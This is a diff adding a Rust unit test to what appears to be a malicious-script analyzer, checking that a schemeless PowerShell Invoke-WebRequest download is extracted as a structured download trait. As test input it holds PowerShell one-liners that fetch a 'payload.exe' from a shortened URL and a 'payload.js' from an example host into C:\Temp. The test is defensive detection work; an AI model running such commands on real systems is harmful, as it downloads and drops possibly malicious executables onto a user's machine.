@@ -7925,6 +7925,34 @@ mod ps1_url_extraction_tests {
     }
 
     #[test]
+    fn iwr_schemeless_domain_path_url_extracted_as_structured_download() {
+        let ps = r#"iwr -UseBasicParsing -Uri 'rebrand.ly/47i82k6' -OutFile C:\Temp\payload.exe"#;
+        let script = format!("powershell -Command \"{}\"\r\n", ps);
+        let report = analyze(script.as_bytes(), &Config::default());
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, dst, .. }
+                        if src == "http://rebrand.ly/47i82k6"
+                            && dst.as_deref() == Some("C:\\Temp\\payload.exe")
+                )
+            }),
+            "schemeless IWR domain/path was not extracted as structured Download: {:?}",
+            report.traits
+        );
+        assert!(
+            !report.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::DownloadInDeobText { src, .. } if src == "http://rebrand.ly/47i82k6"
+                )
+            }),
+            "schemeless IWR domain/path double-emitted as generic: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn iwr_outfile_abbreviation_preserves_destination() {
         let ps = r#"IWR -useb https://iwr-outf.example/payload.js -outf C:\Temp\payload.js"#;
         let script = format!("powershell -Command \"{}\"\r\n", ps);
